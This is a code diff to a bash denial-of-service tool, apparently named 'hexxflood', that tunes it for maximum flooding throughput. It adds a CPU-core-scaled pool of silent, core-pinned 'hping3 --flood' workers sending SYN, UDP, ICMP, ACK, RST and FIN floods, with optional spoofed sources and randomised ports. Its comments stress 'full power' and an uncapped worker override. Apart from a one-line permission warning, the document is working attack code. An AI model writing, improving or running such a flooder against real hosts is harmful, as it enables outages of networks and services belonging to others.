@@ -473,6 +473,54 @@ set_mode() {
     esac
 }
 
+# Size the flood pool for MAXIMUM real throughput. KEY FACT: one `hping3 --flood`
+# already sends as fast as a CPU core allows, so throughput scales with CPU CORES,
+# NOT with process count. The old THREADS×types model (hundreds of procs) thrashed
+# the scheduler and overran the NIC TX queue (ENOBUFS) → it sent *less*. Here we
+# fully saturate every core (and then some) for genuine full power:
+#   easy 1×  medium 2×  high 3×  extreme 4× cores.
+# Set HEXXFLOOD_WORKERS=N to force an exact, UNCAPPED worker count yourself.
+compute_flood_workers() {
+    local cores; cores=$(nproc 2>/dev/null); [[ "$cores" =~ ^[0-9]+$ ]] || cores=2
+    [ "$cores" -lt 1 ] && cores=1
+    CORES=$cores
+    # Manual override wins and is never capped — full control, no compromise.
+    if [[ "${HEXXFLOOD_WORKERS:-}" =~ ^[0-9]+$ ]] && [ "$HEXXFLOOD_WORKERS" -gt 0 ]; then
+        FLOOD_WORKERS=$HEXXFLOOD_WORKERS
+        WORKERS_FORCED=1
+        return
+    fi
+    case "${MODE:-custom}" in
+        easy)    FLOOD_WORKERS=$cores ;;
+        medium)  FLOOD_WORKERS=$(( cores * 2 )) ;;
+        high)    FLOOD_WORKERS=$(( cores * 3 )) ;;
+        extreme) FLOOD_WORKERS=$(( cores * 4 )) ;;
+        *)       FLOOD_WORKERS=$(( cores * 3 )) ;;   # custom
+    esac
+    [ "$FLOOD_WORKERS" -lt 1 ] && FLOOD_WORKERS=1
+    # Ceiling only for the auto modes: past ~4×cores throughput drops from thrash.
+    [ "$FLOOD_WORKERS" -gt 64 ] && FLOOD_WORKERS=64
+}
+
+# Launch ONE silent hping3 --flood worker for a type/port, pinned round-robin to a
+# CPU core (taskset) so every core runs flat-out with no migration overhead.
+# --flood transmits as fast as possible and ignores -i, so no interval is passed.
+launch_flood() {
+    local t="$1" p="$2" pin=""
+    if command -v taskset >/dev/null 2>&1 && [ "${CORES:-1}" -gt 0 ]; then
+        pin="taskset -c $(( FLOOD_IDX % CORES ))"
+        FLOOD_IDX=$(( FLOOD_IDX + 1 ))
+    fi
+    case "$t" in
+        syn)  sudo $DETACH $pin hping3 -S --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
+        udp)  sudo $DETACH $pin hping3 -2 --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
+        icmp) sudo $DETACH $pin hping3 -1 --flood $SPOOF_FLAG            -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
+        ack)  sudo $DETACH $pin hping3 -A --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
+        rst)  sudo $DETACH $pin hping3 -R --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
+        fin)  sudo $DETACH $pin hping3 -F --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
+    esac
+}
+
 # Cumulative TX packet / byte counters straight from the kernel (/sys). This is
 # far lighter and more exact than forking ifconfig every tick, so the live
 # monitor costs almost nothing and never steals cycles from the flood.
@@ -788,15 +836,19 @@ main() {
         echo -e "${YELLOW}⚠️  Interface '$INTERFACE' not found — packet stats may show 0. Use -i to set the right one.${NC}"
     fi
 
+    # Expand the "all" shortcut now so the config display and pool sizing see the
+    # real type list, then size the flood pool for maximum throughput.
+    [ "$ATTACK_TYPES" = "all" ] && ATTACK_TYPES="syn,udp,icmp,ack,rst,fin"
+    compute_flood_workers
+
     echo -e "${YELLOW}Configuration:${NC}"
     echo "  Target Type: ${TARGET_TYPE^^}"
     [ "$TARGET_TYPE" = "url" ] && echo "  URL: $URL"
     echo "  Target IP: $TARGET"
-    echo "  Threads: $THREADS"
     echo "  Mode: ${MODE:-custom}"
     echo "  Attack Types: ${ATTACK_TYPES:-all}"
     echo "  Packet Size: $PACKET_SIZE bytes"
-    echo "  Delay: $DELAY"
+    echo -e "  Flood Power: ${GREEN}${FLOOD_WORKERS}${NC} parallel hping3 --flood workers, core-pinned across ${CORES} CPU cores$([ "${WORKERS_FORCED:-0}" = 1 ] && echo " (forced)")"
     echo "  Duration: ${ATTACK_DURATION:-Infinite}"
     echo ""
     echo -e "${RED}⚠️ WARNING: Use only on networks you OWN or have permission to test!${NC}"
@@ -822,10 +874,9 @@ main() {
         echo ""
     fi
     
-    [ "$ATTACK_TYPES" = "all" ] && ATTACK_TYPES="syn,udp,icmp,ack,rst,fin"
-
     if echo ",$ATTACK_TYPES," | grep -qE ',(syn|udp|icmp|ack|rst|fin),'; then
         echo -e "${GREEN}Starting network layer attack on $TARGET...${NC}"
+        echo -e "${GREEN}⚡ ${FLOOD_WORKERS} flood workers across ${CORES} cores — full power${NC}"
         echo -e "${YELLOW}Press Ctrl+C to stop${NC}"
         echo ""
 
@@ -846,37 +897,44 @@ main() {
         PP=""
         [ "$RANDOM_PORTS" = true ] && PP="++"
 
-        for i in $(seq 1 $THREADS); do
-            for type in $(echo "$ATTACK_TYPES" | tr ',' ' '); do
-                case $type in
-                    syn) for p in $TCP_PORTS; do sudo $DETACH hping3 -S --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
-                    udp) for p in $UDP_PORTS; do sudo $DETACH hping3 -2 --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
-                    icmp) sudo $DETACH hping3 -1 --flood $SPOOF_FLAG -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & ;;
-                    ack) for p in $TCP_PORTS; do sudo $DETACH hping3 -A --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
-                    rst) for p in $TCP_PORTS; do sudo $DETACH hping3 -R --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
-                    fin) for p in $TCP_PORTS; do sudo $DETACH hping3 -F --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
-                esac
-            done
+        # Build the list of (type:port) work items from the selected types.
+        local -a specs=()
+        local type p
+        for type in $(echo "$ATTACK_TYPES" | tr ',' ' '); do
+            case $type in
+                icmp)            specs+=("icmp:") ;;
+                syn|ack|rst|fin) for p in $TCP_PORTS; do specs+=("$type:$p"); done ;;
+                udp)             for p in $UDP_PORTS; do specs+=("udp:$p"); done ;;
+            esac
+        done
+        local nspec=${#specs[@]}; [ "$nspec" -eq 0 ] && nspec=1
+        # Run at least one worker per work item so every type/port is covered.
+        [ "$FLOOD_WORKERS" -lt "$nspec" ] && FLOOD_WORKERS=$nspec
+
+        # Spawn the pool, round-robining work items and core pins across workers.
+        FLOOD_IDX=0
+        local w spec
+        for (( w = 0; w < FLOOD_WORKERS; w++ )); do
+            spec=${specs[$(( w % nspec ))]}
+            launch_flood "${spec%%:*}" "${spec#*:}"
         done
 
         # One extra "sampler" flood whose real hping3 output is captured to a log
-        # (the bulk floods above stay silent for speed). It mirrors the first
-        # selected attack type so the banner reflects the actual attack, and its
-        # "packets transmitted" summary is shown on stop. stdin=/dev/null + output
-        # to a file means it never touches the TTY, so no setsid is needed and we
-        # keep its PID to SIGINT it cleanly for the summary.
+        # (the pool above stays silent for speed). It mirrors the first work item
+        # so the banner reflects the actual attack, and its "packets transmitted"
+        # summary is shown on stop. stdin=/dev/null + output to a file means it
+        # never touches the TTY, so no setsid is needed and we keep its PID to
+        # SIGINT it cleanly for the summary.
         HPING_LOG="/tmp/hexxflood_hping.log"
         : > "$HPING_LOG" 2>/dev/null
-        local first_type sport uport
-        first_type=$(echo "$ATTACK_TYPES" | cut -d',' -f1)
-        sport="${TCP_PORTS%% *}"; uport="${UDP_PORTS%% *}"
-        case "$first_type" in
-            udp)  sudo hping3 -2 --flood $SPOOF_FLAG -p ${PP}$uport -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
-            icmp) sudo hping3 -1 --flood $SPOOF_FLAG            -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
-            ack)  sudo hping3 -A --flood $SPOOF_FLAG -p ${PP}$sport -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
-            rst)  sudo hping3 -R --flood $SPOOF_FLAG -p ${PP}$sport -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
-            fin)  sudo hping3 -F --flood $SPOOF_FLAG -p ${PP}$sport -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
-            *)    sudo hping3 -S --flood $SPOOF_FLAG -p ${PP}$sport -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
+        local s_type="${specs[0]%%:*}" s_port="${specs[0]#*:}"
+        case "$s_type" in
+            udp)  sudo hping3 -2 --flood $SPOOF_FLAG -p ${PP}$s_port -d $PACKET_SIZE $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
+            icmp) sudo hping3 -1 --flood $SPOOF_FLAG               -d $PACKET_SIZE $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
+            ack)  sudo hping3 -A --flood $SPOOF_FLAG -p ${PP}$s_port -d $PACKET_SIZE $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
+            rst)  sudo hping3 -R --flood $SPOOF_FLAG -p ${PP}$s_port -d $PACKET_SIZE $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
+            fin)  sudo hping3 -F --flood $SPOOF_FLAG -p ${PP}$s_port -d $PACKET_SIZE $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
+            *)    sudo hping3 -S --flood $SPOOF_FLAG -p ${PP}$s_port -d $PACKET_SIZE $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
         esac
         HPING_SAMPLER_PID=$!
     fi
